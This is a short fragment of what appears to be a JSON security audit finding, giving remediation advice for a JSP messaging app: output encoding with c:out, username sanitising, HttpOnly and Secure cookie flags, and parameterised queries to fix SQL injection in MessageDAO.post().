            "remediation": "Encode all user-sourced fields with `<c:out>` or `fn:escapeXml()`:\n\n```jsp\nby <c:out value=\"${msg.author}\"/> on <c:out value=\"${msg.timestamp}\"/>\n```\n\nAdditionally:\n- Sanitise the username at registration/login time so it cannot contain HTML characters.\n- Set the `user` cookie with `HttpOnly` and `Secure` flags in `AuthenticationController.setCookie()`.\n- Fix the SQL injection in `MessageDAO.post()` using parameterised queries."
          }
